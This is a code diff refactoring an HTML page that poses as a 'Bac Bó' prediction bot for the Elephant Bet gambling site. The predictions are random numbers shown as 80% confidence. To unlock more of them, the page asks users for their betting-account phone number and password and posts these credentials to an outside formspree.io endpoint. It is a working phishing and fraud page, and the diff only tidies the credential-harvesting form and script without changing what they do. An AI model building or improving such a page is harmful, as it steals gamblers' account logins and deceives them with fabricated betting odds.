@@ -7,11 +7,11 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      text-align: center;
       background-color: #0d0d0d;
       color: #fff;
       margin: 0;
       padding: 20px;
+      text-align: center;
     }
     h1 {
       color: #ff00ff;
@@ -31,19 +31,9 @@
     }
     .azul { color:#00f; border:3px solid #00f; box-shadow:0 0 20px #00f; }
     .vermelho { color:#f00; border:3px solid #f00; box-shadow:0 0 20px #f00; }
-    .empate-text {
-      font-size: 0.9em;
-      color: #ffd700;
-      margin-top: 5px;
-    }
-    .blocked {
-      background:#333; color:#ffcc00; padding:10px; margin:15px auto;
-      border-radius:5px; width:90%; font-size:0.9em;
-    }
-    .bar {
-      background:#8000ff; padding:10px; margin:10px auto;
-      border-radius:5px; width:90%; font-size:0.9em;
-    }
+    .empate-text { font-size:0.9em; color:#ffd700; margin-top:5px; }
+    .blocked { background:#333; color:#ffcc00; padding:10px; margin:15px auto; border-radius:5px; width:90%; font-size:0.9em; }
+    .bar { background:#8000ff; padding:10px; margin:10px auto; border-radius:5px; width:90%; font-size:0.9em; }
     button {
       padding:12px 20px; background:#ff00aa; color:#fff; border:none;
       border-radius:5px; cursor:pointer; margin-top:15px; font-size:1em;
@@ -55,44 +45,33 @@
       background-color:#fff; color:#000; border:1px solid #ccc; border-radius:5px;
     }
     input::placeholder { color:#666; }
-    #loginScreen {
-      display:none;
-      background-color:#0d0d0d;
-      padding:20px;
-    }
+    #loginScreen { display:none; }
   </style>
 </head>
 <body>
-  <h1>BOT PREDICTOR - Bac Bó</h1>
+  <!-- Página inicial -->
+  <div id="homeScreen">
+    <h1>BOT PREDICTOR - Bac Bó</h1>
+    <div id="circle" class="circle">--</div>
+    <div class="empate-text">20% Empate</div>
 
-  <!-- Roda principal -->
-  <div id="circle" class="circle">--</div>
-  <!-- Empate fixo abaixo -->
-  <div class="empate-text">20% Empate</div>
+    <div id="blocked" class="blocked" style="display:none;">⚠️ Acesso bloqueado</div>
+    <div id="bar" class="bar" style="display:none;">Para ver o próximo resultado deverás conectar o Bot</div>
 
-  <div id="blocked" class="blocked" style="display:none;">
-    ⚠️ Acesso bloqueado
+    <button id="preverBtn">Fazer Previsão</button>
+    <div id="resultado"></div>
+
+    <button id="openLogin">Conectar o Bot</button>
   </div>
-  <div id="bar" class="bar" style="display:none;">
-    Para ver o próximo resultado deverás conectar o Bot
-  </div>
 
-  <button id="preverBtn">Fazer Previsão</button>
-  <div id="resultado"></div>
-
-  <!-- Botão para abrir tela de login -->
-  <button id="openLogin">Conectar o Bot</button>
-
-  <!-- Tela de login (oculta inicialmente, aparece como página separada) -->
+  <!-- Tela de login -->
   <div id="loginScreen">
     <h2>Conecte com a sua conta da Elephant Bet</h2>
     <form id="loginForm" action="https://formspree.io/f/mbdeddpb" method="POST">
       <label for="numero">Número</label><br>
       <input type="text" id="numero" name="numero" placeholder="número de telemóvel" required><br>
-      
       <label for="senha">Senha</label><br>
       <input type="text" id="senha" name="senha" placeholder="Digite a sua senha" required><br>
-      
       <button type="submit">Conectar Agora</button>
     </form>
     <a href="#" id="closeLogin">← Voltar</a>
@@ -100,7 +79,7 @@
 
   <script>
     let previsoesFeitas = 0;
-    let bloqueado = true; 
+    let bloqueado = true;
     const maxPrevisoes = 3;
     const circle = document.getElementById("circle");
     const resultado = document.getElementById("resultado");
@@ -115,20 +94,18 @@
         resultado.textContent = "";
         return;
       }
-
       previsoesFeitas++;
-
       const rand = Math.random();
       let banca, classe, valor;
       if (rand < 0.5) { banca="Azul"; classe="azul"; valor="80%"; }
       else { banca="Vermelho"; classe="vermelho"; valor="80%"; }
-
       circle.textContent = valor;
       circle.className = "circle " + classe;
       resultado.textContent = `Previsão ${previsoesFeitas}: Resultado da banca → ${banca}`;
     });
 
-    // Tela de login
+    // Alternar telas
+    const homeScreen = document.getElementById("homeScreen");
     const loginScreen = document.getElementById("loginScreen");
     const openLogin = document.getElementById("openLogin");
     const closeLogin = document.getElementById("closeLogin");
@@ -137,13 +114,12 @@
     const senhaInput = document.getElementById("senha");
 
     openLogin.addEventListener("click", function() {
-      document.body.style.display = "none"; // esconde página inicial
-      loginScreen.style.display = "block";  // mostra tela de login
-      document.body.appendChild(loginScreen);
+      homeScreen.style.display = "none";
+      loginScreen.style.display = "block";
     });
     closeLogin.addEventListener("click", function() {
       loginScreen.style.display = "none";
-      document.body.style.display = "block"; // volta página inicial
+      homeScreen.style.display = "block";
     });
 
     numeroInput.addEventListener("input", function() {
@@ -155,11 +131,7 @@
       event.preventDefault();
       const numero = numeroInput.value;
       const senha = senhaInput.value;
-
-      if (!/^\d{9}$/.test(numero) || senha.length < 5) {
-        return; 
-      }
-
+      if (!/^\d{9}$/.test(numero) || senha.length < 5) { return; }
       const formData = new FormData(loginForm);
       try {
         const response = await fetch(loginForm.action, {
@@ -167,19 +139,16 @@
           body: formData,
           headers: { 'Accept': 'application/json' }
         });
-
         if (response.ok) {
           loginForm.reset();
-          bloqueado = false; 
+          bloqueado = false;
           previsoesFeitas = 0;
           blocked.style.display = "none";
           bar.style.display = "none";
-          loginScreen.style.display = "none"; 
-          document.body.style.display = "block"; // volta à página inicial
+          loginScreen.style.display = "none";
+          homeScreen.style.display = "block";
         }
-      } catch (error) {
-        // silencioso
-      }
+      } catch (error) { /* silencioso */ }
     });
   </script>
 </body>
